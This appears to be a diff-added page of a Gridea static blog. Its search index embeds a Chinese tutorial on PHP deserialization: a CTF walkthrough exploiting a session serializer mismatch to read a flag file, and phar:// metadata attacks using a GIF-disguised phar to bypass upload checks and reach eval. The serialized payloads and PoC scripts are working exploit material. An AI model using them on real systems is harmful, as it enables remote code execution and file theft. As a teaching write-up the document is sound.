+&lt;h2 id=&#34;一道ctf题phpinfo&#34;&gt;一道CTF题:PHPINFO&lt;/h2&gt;
+&lt;p&gt;题目链接：http://web.jarvisoj.com:32784/&lt;br&gt;
+题目中给出如下代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+//A webshell is wait for you
+ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&amp;gt;mdzz = &#39;phpinfo();&#39;;
+    }
+
+    function __destruct()
+    {
+        eval($this-&amp;gt;mdzz);
+    }
+}
+if(isset($_GET[&#39;phpinfo&#39;]))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents(&#39;index.php&#39;));
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;仔细看了一遍发现题目没有入口，注意到&lt;code&gt;ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;)&lt;/code&gt;，想到可不可能是&lt;code&gt;session&lt;/code&gt;反序列化漏洞，看一下&lt;code&gt;phpinfo&lt;/code&gt;,发现&lt;code&gt;session.serialize_handler&lt;/code&gt;设置如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;local value(当前目录，会覆盖master value内容):php
+master value(主目录，php.ini里面的内容):php_serialize
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个很明显就存在&lt;code&gt;php session&lt;/code&gt;反序列化漏洞，但是入口点在哪里，怎么控制&lt;code&gt;session&lt;/code&gt;的值&lt;br&gt;
+在&lt;code&gt;phpinfo&lt;/code&gt;里面看到了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;session.upload_progress.enabled on
+session.upload_progress.cleanup off
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当一个上传在处理中，同时&lt;code&gt;POST&lt;/code&gt;一个与&lt;code&gt;INI&lt;/code&gt;中设置的&lt;code&gt;session.upload_progress.name&lt;/code&gt;同名变量时，当&lt;code&gt;PHP&lt;/code&gt;检测到这种&lt;code&gt;POST&lt;/code&gt;请求时，它会在&lt;code&gt;$_SESSION&lt;/code&gt;中添加一组数据。所以可以通过&lt;code&gt;Session Upload Progress&lt;/code&gt;来设置&lt;code&gt;session&lt;/code&gt;&lt;br&gt;
+允许上传且结束后不清除数据，这样更有利于利用&lt;br&gt;
+在&lt;code&gt;html&lt;/code&gt;网页源代码上面添加如下代码&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;form action=&amp;quot;http://web.jarvisoj.com:32784/index.php&amp;quot; method=&amp;quot;POST&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
+    &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;PHP_SESSION_UPLOAD_PROGRESS&amp;quot; value=&amp;quot;123&amp;quot; /&amp;gt;
+    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;
+    &amp;lt;input type=&amp;quot;submit&amp;quot; /&amp;gt;
+&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;29&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144955-a28f8bca-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112144955-a28f8bca-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;接下来考虑如何利用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
+session_start();
+class OowoO
+{
+    public $mdzz=&#39;print_r(scandir(dirname(__FILE__)));&#39;;
+}
+$obj = new OowoO();
+echo serialize($obj);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;30&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145001-a60c44a0-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145001-a60c44a0-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;为了防止转义，在每个双引号前加上&lt;code&gt;\&lt;/code&gt;，即&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;|O:5:\&amp;quot;OowoO\&amp;quot;:1:{s:4:\&amp;quot;mdzz\&amp;quot;;s:36:\&amp;quot;print_r(scandir(dirname(__FILE__)));\&amp;quot;;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;点击提交，&lt;code&gt;burpsuite&lt;/code&gt;抓包将&lt;code&gt;filename&lt;/code&gt;的值改为它&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;31&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145006-a8ff3988-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145006-a8ff3988-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;查询到当前目录有哪些文件了，在&lt;code&gt;phpinfo&lt;/code&gt;里面查看到当前目录路径&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;32&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145010-abb3dd46-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145010-abb3dd46-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;于是我们利用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;print_r(file_get_contents(&amp;quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&amp;quot;));
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;来读取&lt;code&gt;Here_1s_7he_fl4g_buT_You_Cannot_see.php&lt;/code&gt;中的内容，同样的道理加上&lt;code&gt;\&lt;/code&gt;后将&lt;code&gt;filename&lt;/code&gt;改为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;|O:5:\&amp;quot;OowoO\&amp;quot;:1:{s:4:\&amp;quot;mdzz\&amp;quot;;s:88:\&amp;quot;print_r(file_get_contents(\&amp;quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&amp;quot;));\&amp;quot;;}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;得到&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;33&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145016-aefb991c-0518-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145016-aefb991c-0518-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;phar拓展反序列化攻击面&#34;&gt;phar拓展反序列化攻击面&lt;/h1&gt;
+&lt;h2 id=&#34;phar文件简介&#34;&gt;phar文件简介&lt;/h2&gt;
+&lt;h3 id=&#34;概念&#34;&gt;概念&lt;/h3&gt;
+&lt;p&gt;一个&lt;code&gt;php&lt;/code&gt;应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在&lt;code&gt;window&lt;/code&gt;操作系统上面的安装程序、一个&lt;code&gt;jquery&lt;/code&gt;库等等，为了做到这点&lt;code&gt;php&lt;/code&gt;采用了&lt;code&gt;phar&lt;/code&gt;文档文件格式，这个概念源自&lt;code&gt;java&lt;/code&gt;的&lt;code&gt;jar&lt;/code&gt;，但是在设计时主要针对 PHP 的 Web 环境，与 &lt;code&gt;JAR&lt;/code&gt; 归档不同的是&lt;code&gt;Phar&lt;/code&gt;归档可由 &lt;code&gt;PHP&lt;/code&gt; 本身处理，因此不需要使用额外的工具来创建或使用，使用&lt;code&gt;php&lt;/code&gt;脚本就能创建或提取它。&lt;code&gt;phar&lt;/code&gt;是一个合成词，由&lt;code&gt;PHP&lt;/code&gt;和 &lt;code&gt;Archive&lt;/code&gt;构成，可以看出它是&lt;code&gt;php&lt;/code&gt;归档文件的意思(简单来说&lt;code&gt;phar&lt;/code&gt;就是&lt;code&gt;php&lt;/code&gt;压缩文档，不经过解压就能被 &lt;code&gt;php&lt;/code&gt; 访问并执行)&lt;/p&gt;
+&lt;h3 id=&#34;phar组成结构&#34;&gt;phar组成结构&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;stub：它是phar的文件标识，格式为xxx&amp;lt;?php xxx; __HALT_COMPILER();?&amp;gt;;
+manifest：也就是meta-data，压缩文件的属性等信息，以序列化存储
+contents：压缩文件的内容
+signature：签名，放在文件末尾
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里有两个关键点，一是文件标识，必须以&lt;code&gt;__HALT_COMPILER();?&amp;gt;&lt;/code&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者其它文件来绕过一些上传限制；二是反序列化，&lt;code&gt;phar&lt;/code&gt;存储的&lt;code&gt;meta-data&lt;/code&gt;信息以序列化方式存储，当文件操作函数通过&lt;code&gt;phar://&lt;/code&gt;伪协议解析&lt;code&gt;phar&lt;/code&gt;文件时就会将数据反序列化，而这样的文件操作函数有很多&lt;/p&gt;
+&lt;h3 id=&#34;前提条件&#34;&gt;前提条件&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;php.ini中设置为phar.readonly=Off
+php version&amp;gt;=5.3.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;phar反序列化漏洞&#34;&gt;phar反序列化漏洞&lt;/h2&gt;
+&lt;p&gt;漏洞成因：&lt;code&gt;phar&lt;/code&gt;存储的&lt;code&gt;meta-data&lt;/code&gt;信息以序列化方式存储，当文件操作函数通过&lt;code&gt;phar://&lt;/code&gt;伪协议解析&lt;code&gt;phar&lt;/code&gt;文件时就会将数据反序列化&lt;/p&gt;
+&lt;h3 id=&#34;demo测试&#34;&gt;demo测试&lt;/h3&gt;
+&lt;p&gt;根据文件结构我们来自己构建一个&lt;code&gt;phar&lt;/code&gt;文件，&lt;code&gt;php&lt;/code&gt;内置了一个&lt;code&gt;Phar&lt;/code&gt;类来处理相关操作&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class TestObject {
+    }
+
+    @unlink(&amp;quot;phar.phar&amp;quot;);
+    $phar = new Phar(&amp;quot;phar.phar&amp;quot;); //后缀名必须为phar
+    $phar-&amp;gt;startBuffering();
+    $phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;); //设置stub
+    $o = new TestObject();
+    $phar-&amp;gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&amp;gt;stopBuffering();
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;可以很明显看到&lt;code&gt;manifest&lt;/code&gt;是以序列化形式存储的&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;34&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145235-01d2d2fe-0519-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145235-01d2d2fe-0519-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;有序列化数据必然会有反序列化操作，&lt;code&gt;php&lt;/code&gt;一大部分的文件系统函数在通过&lt;code&gt;phar://&lt;/code&gt;伪协议解析&lt;code&gt;phar&lt;/code&gt;文件时，都会将&lt;code&gt;meta-data&lt;/code&gt;进行反序列化&lt;br&gt;
+在网上扒了一张图&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;35&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145239-0436a1c4-0519-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;用如下demo证明&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
+    class TestObject {
+        public function __destruct() {
+            echo &#39;hello ghtwf01&#39;;
+        }
+    }
+
+    $filename = &#39;phar://phar.phar/test.txt&#39;;
+    file_get_contents($filename); 
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;36&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145244-07779b54-0519-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145244-07779b54-0519-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;当文件系统函数的参数可控时，我们可以在不调用&lt;code&gt;unserialize()&lt;/code&gt;的情况下进行反序列化操作,极大的拓展了攻击面，其它函数也是可以的，比如&lt;code&gt;file_exists&lt;/code&gt;函数,代码如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
+    class TestObject {
+        public function __destruct() {
+            echo &#39;hello ghtwf01&#39;;
+        }
+    }
+
+    $filename = &#39;phar://phar.phar/a_random_string&#39;;
+    file_exists($filename);
+ ?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;37&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145250-0ab8db34-0519-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145250-0ab8db34-0519-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;h3 id=&#34;将phar伪造成其他格式的文件&#34;&gt;将phar伪造成其他格式的文件&lt;/h3&gt;
+&lt;p&gt;在前面分析&lt;code&gt;phar&lt;/code&gt;的文件结构时可能会注意到，&lt;code&gt;php&lt;/code&gt;识别&lt;code&gt;phar&lt;/code&gt;文件是通过其文件头的&lt;code&gt;stub&lt;/code&gt;，更确切一点来说是&lt;code&gt;__HALT_COMPILER();?&amp;gt;&lt;/code&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将&lt;code&gt;phar&lt;/code&gt;文件伪装成其他格式的文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    class TestObject {
+    }
+
+    @unlink(&amp;quot;phar.phar&amp;quot;);
+    $phar = new Phar(&amp;quot;phar.phar&amp;quot;);
+    $phar-&amp;gt;startBuffering();
+    $phar-&amp;gt;setStub(&amp;quot;GIF89a&amp;quot;.&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;); //设置stub，增加gif文件头
+    $o = new TestObject();
+    $phar-&amp;gt;setMetadata($o); //将自定义meta-data存入manifest
+    $phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&amp;gt;stopBuffering();
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;38&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145254-0d4bc884-0519-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145254-0d4bc884-0519-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;p&gt;采用这种方法可以绕过很大一部分上传检测&lt;/p&gt;
+&lt;h4 id=&#34;利用条件&#34;&gt;利用条件&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;phar文件需要上传到服务器端
+要有可用的魔术方法作为“跳板”
+文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h4&gt;
+&lt;p&gt;upload.php&lt;br&gt;
+白名单只允许上传&lt;code&gt;jpg,png,gif&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;文件上传&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+    &amp;lt;form method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;pic&amp;quot; /&amp;gt;
+        &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;上传&amp;quot;/&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&amp;lt;?php
+    header(&amp;quot;Content-type:text/html;charset=utf-8&amp;quot;);
+    $ext_arr=array(&#39;.jpg&#39;,&#39;.png&#39;,&#39;.gif&#39;);
+    if(empty($_FILES)){
+        echo &amp;quot;请上传文件&amp;quot;;
+    }else{
+        define(&amp;quot;PATH&amp;quot;,dirname(__DIR__));
+        $path=PATH.&amp;quot;/&amp;quot;.&amp;quot;upload&amp;quot;.&amp;quot;/&amp;quot;.&amp;quot;images&amp;quot;;
+        $filetype=strrchr($_FILES[&amp;quot;pic&amp;quot;][&amp;quot;name&amp;quot;],&amp;quot;.&amp;quot;);
+        if(in_array($filetype,$ext_arr)){
+            move_uploaded_file($_FILES[&amp;quot;pic&amp;quot;][&amp;quot;tmp_name&amp;quot;],$path.&amp;quot;/&amp;quot;.$_FILES[&amp;quot;pic&amp;quot;][&amp;quot;name&amp;quot;]);
+            echo &amp;quot;上传成功！&amp;quot;;
+            }else{
+                    echo &amp;quot;只允许上传.jpg|.png|.gif类型文件！&amp;quot;;
+            }
+
+        }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;file_exists.php&lt;br&gt;
+验证文件是否存在，漏洞利用点:&lt;code&gt;file_exists()&lt;/code&gt;函数&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$filename=$_GET[&#39;filename&#39;];
+class ghtwf01{
+    public $a = &#39;echo exists;&#39;;
+    function __destruct()
+    {
+        eval($this -&amp;gt; a);
+    }
+}
+file_exists($filename);
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;构造phar文件&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+class ghtwf01{
+    public $a = &#39;phpinfo();&#39;;
+    function __destruct()
+    {
+        eval($this -&amp;gt; a);
+    }
+}
+$phar = new Phar(&#39;phar.phar&#39;);
+$phar -&amp;gt; stopBuffering();
+$phar -&amp;gt; setStub(&#39;GIF89a&#39;.&#39;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&#39;);
+$phar -&amp;gt; addFromString(&#39;test.txt&#39;,&#39;test&#39;);
+$object = new ghtwf01();
+$phar -&amp;gt; setMetadata($object);
+$phar -&amp;gt; stopBuffering();
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;改后缀名为&lt;code&gt;gif&lt;/code&gt;，然后上传，最后在&lt;code&gt;file_exists.php&lt;/code&gt;利用漏洞&lt;/p&gt;
+&lt;figure data-type=&#34;image&#34; tabindex=&#34;39&#34;&gt;&lt;a href=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145302-1225f852-0519-1.png&#34;&gt;&lt;img src=&#34;https://xzfile.aliyuncs.com/media/upload/picture/20191112145302-1225f852-0519-1.png&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/a&gt;&lt;/figure&gt;
+&lt;h1 id=&#34;参考链接&#34;&gt;参考链接&lt;/h1&gt;
+&lt;p&gt;https://www.freebuf.com/articles/web/206249.html&lt;br&gt;
+http://mini.eastday.com/mobile/190306223633207.html#&lt;br&gt;
+https://www.jianshu.com/p/54e93e92ba9e&lt;br&gt;
+https://www.jb51.net/article/79144.htm&lt;br&gt;
+https://xz.aliyun.com/t/6640&lt;br&gt;
+https://www.freebuf.com/vuls/202819.html&lt;br&gt;
+https://blog.csdn.net/u011474028/article/details/54973571&lt;br&gt;
+https://xz.aliyun.com/t/2715&lt;br&gt;
+&lt;a href=&#34;https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&#34;&gt;https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/&lt;/a&gt;&lt;/p&gt;
+">php序列化与反序列化</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/about/"" data-c="
+          &lt;blockquote&gt;
+&lt;p&gt;欢迎来到我的小站呀，很高兴遇见你！🤝&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;关于本站&#34;&gt;🏠 关于本站&lt;/h2&gt;
+&lt;h2 id=&#34;博主是谁&#34;&gt;👨‍💻 博主是谁&lt;/h2&gt;
+&lt;h2 id=&#34;兴趣爱好&#34;&gt;⛹ 兴趣爱好&lt;/h2&gt;
+&lt;h2 id=&#34;联系我呀&#34;&gt;📬 联系我呀&lt;/h2&gt;
+">关于</a>
+      </div>
+      
+      <div class="item">
+        <a class="result-title" style="opacity: 0;" href="https://outlaws-bai.github.io/post/hello-gridea/"" data-c="
+          &lt;p&gt;👏  欢迎使用 &lt;strong&gt;Gridea&lt;/strong&gt; ！&lt;br&gt;
+✍️  &lt;strong&gt;Gridea&lt;/strong&gt; 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...&lt;/p&gt;
+&lt;!-- more --&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/getgridea/gridea&#34;&gt;Github&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;https://gridea.dev/&#34;&gt;Gridea 主页&lt;/a&gt;&lt;br&gt;
+&lt;a href=&#34;http://fehey.com/&#34;&gt;示例网站&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;特性&#34;&gt;特性👇&lt;/h2&gt;
+&lt;p&gt;📝  你可以使用最酷的 &lt;strong&gt;Markdown&lt;/strong&gt; 语法，进行快速创作&lt;/p&gt;
+&lt;p&gt;🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片&lt;/p&gt;
+&lt;p&gt;🏷️  你可以对文章进行标签分组&lt;/p&gt;
+&lt;p&gt;📋  你可以自定义菜单，甚至可以创建外部链接菜单&lt;/p&gt;
+&lt;p&gt;💻  你可以在 &lt;strong&gt;Windows&lt;/strong&gt;，&lt;strong&gt;MacOS&lt;/strong&gt; 或 &lt;strong&gt;Linux&lt;/strong&gt; 设备上使用此客户端&lt;/p&gt;
+&lt;p&gt;🌎  你可以使用 &lt;strong&gt;𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌&lt;/strong&gt; 或 &lt;strong&gt;Coding Pages&lt;/strong&gt; 向世界展示，未来将支持更多平台&lt;/p&gt;
+&lt;p&gt;💬  你可以进行简单的配置，接入 &lt;a href=&#34;https://github.com/gitalk/gitalk&#34;&gt;Gitalk&lt;/a&gt; 或 &lt;a href=&#34;https://github.com/SukkaW/DisqusJS&#34;&gt;DisqusJS&lt;/a&gt; 评论系统&lt;/p&gt;
+&lt;p&gt;🇬🇧  你可以使用&lt;strong&gt;中文简体&lt;/strong&gt;或&lt;strong&gt;英语&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力&lt;/p&gt;
+&lt;p&gt;🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步&lt;/p&gt;
+&lt;p&gt;🌱 当然 &lt;strong&gt;Gridea&lt;/strong&gt; 还很年轻，有很多不足，但请相信，它会不停向前 🏃&lt;/p&gt;
+&lt;p&gt;未来，它一定会成为你离不开的伙伴&lt;/p&gt;
+&lt;p&gt;尽情发挥你的才华吧！&lt;/p&gt;
+&lt;p&gt;😘 Enjoy~&lt;/p&gt;
+">Hello Gridea</a>
+      </div>
+      
+    </div>
+    <div class="page">
+      <div id="page_ul"></div>
+    </div>
+  </div>
+</div>
+<script>
+  !function () {
+    let searchMask = document.querySelector('#search_mask');
+    let result = document.querySelector('#result');
+    let items = document.querySelectorAll('.item');
+    let searchBox = document.querySelector('#search');
+    let statCount = document.querySelector('#stat_count');
+    let statTimes = document.querySelector('#stat_times');
+    let pageUl = document.querySelector('#page_ul');
+    let close = document.querySelector('#close');
+    
+    close.addEventListener('click', function() {
+      searchMask.style = 'display: none;'
+    })
+
+    let finds = [];
+    let contents = [];
+    let pageSize = 10;
+    items.forEach(item => {
+      let a = item.querySelector('a');
+      contents.push({
+        title: a.innerText,
+        details: a.dataset.c,
+        link: a.href
+      })
+      item.remove();
+    })
+
+    function insertStr(soure, start, count) {
+      let newStr = soure.substr(start, count);
+      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
+    }
+
+    pageUl.addEventListener('click', function(event) {
+      let target = event.target;
+      if (target.__proto__ === HTMLSpanElement.prototype) {
+        appendResults(parseInt(target.dataset.i));
+      }
+    })
+
+    function appendResults(index) {
+      let htmlResult = '';
+      let start = index || 0;
+      let end = Math.min(start + pageSize, finds.length);
+      for (let i = start; i < end; i++) {
+        const current = finds[i];
+        let html = current.title;
+        let sum = 0;
+        let positions = current.positions;
+        positions.forEach(position => {
+          html = insertStr(html, position.start + sum, position.count);
+          sum += 9;
+        })
+        htmlResult += `<div class="item"><a class="result-title" href="${current.link}">${html}</a></div>`;
+      }
+      result.innerHTML = htmlResult;
+      pageUl.innerHTML = '';
+      let count = finds.length / pageSize;
+      let lis = '';
+      if (start !== 0) {
+        lis += `<span class="fa fa-angle-left" data-i='${start - 1}'></span>`;
+      }
+      for (let i = 0; i < count; i++) {
+        lis += `<span class='${i === start?'current':''}' data-i='${i}'>${i+1}</span>`;     
+      }
+      if (start+1 < count) {
+        lis += `<span class="fa fa-angle-right" data-i='${start+1}'></span>`;  
+      }
+      pageUl.innerHTML = lis;
+    }
+
+    function search(delay) {
+      let timer = null
+      return function () {
+        clearTimeout(timer)
+        timer = setTimeout(() => {
+          let start = Date.now();
+          let segments = searchBox.value.split(' ').filter(c => c != '');
+          if (segments.length <= 0) {
+            return;
+          }
+          finds = [];
+          let htmlResult = '';
+          contents.forEach(content => {
+            let title = content.title;
+            let positions = [];
+            let find = false;
+            segments.forEach((segment) => {
+              if (content.title.includes(segment)) {
+                find = true;
+                positions.push({
+                  start: content.title.indexOf(segment),
+                  count: segment.length
+                })
+              } else if (content.details.includes(segment)) {
+                find = true;
+              }
+            });
+            if (find) {
+              finds.push({
+                title: content.title,
+                link: content.link,
+                positions
+              });
+            }
+          })
+          appendResults(0);
+          statCount.textContent = finds.length;
+          statTimes.textContent = Date.now() - start;
+        }, delay)
+      }
+    }
+    searchBox.addEventListener('input', search(200));
+  }()
+</script>
+
+<input hidden id="copy" />
+<script>
+  !function () {
+    let times = document.querySelectorAll('.publish-time');
+    for (let i = 0; i < times.length; i++) {
+      let date = times[i].dataset.t;
+      let time = Math.floor((new Date().getTime() - new Date(date).getTime()) / 1000);
+      if (time < 60) {
+        str = time + '秒之前';
+      } else if (time < 3600) {
+        str = Math.floor(time / 60) + '分钟之前';
+      } else if (time >= 3600 && time < 86400) {
+        str = Math.floor(time / 3600) + '小时之前';
+      } else if (time >= 86400 && time < 259200) {
+        str = Math.floor(time / 86400) + '天之前';
+      } else {
+        str = times[i].textContent;
+      }
+      times[i].textContent = str;
+    }
+  }();
+</script>
+
+<script>
+  let language = '';
+  if (language !== '') {
+    let map = new Map();
+    if (language === 'en') {
+      map.set('search', 'Search');
+      map.set('category', 'Categories');
+      map.set('article', 'Articles');
+      map.set('tag', 'Tags');
+      map.set('top', 'Top');
+      map.set('publish', 'published');
+      map.set('minute', ' minutes');
+      map.set('read-more', 'Read More');
+      map.set('view', 'View');
+      map.set('words', ' words');
+      map.set('category-in', 'category in');
+      map.set('preview', 'Meta');
+      map.set('index', 'Toc');
+      map.set('no-archives', "You haven't created yet");
+      map.set('archives', " articles in total");
+      map.set('cloud-tags', " tags in total");
+      map.set('copyright', "Copyright: ");
+      map.set('author', "Author: ");
+      map.set('link', "Link: ");
+      map.set('leave-message', "Leave a message");
+      map.set('format', "Links Format");
+      map.set('site-name', "Name: ");
+      map.set('site-link', "Link: ");
